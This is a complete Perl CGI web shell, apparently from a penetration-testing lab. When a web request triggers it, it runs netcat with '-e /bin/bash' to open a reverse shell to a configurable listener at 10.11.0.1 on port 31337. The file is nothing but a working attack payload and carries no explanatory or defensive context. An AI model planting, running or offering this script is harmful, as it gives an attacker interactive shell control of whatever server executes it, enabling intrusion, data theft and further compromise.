#!/usr/bin/perl
use strict;

# To change 
$lport = "31337";
$lhost = "10.11.0.1";

# Executed
print "Content-type: text/html\n\n";
system("nc -nv " . $lhost . " " . $lport . " -e /bin/bash");
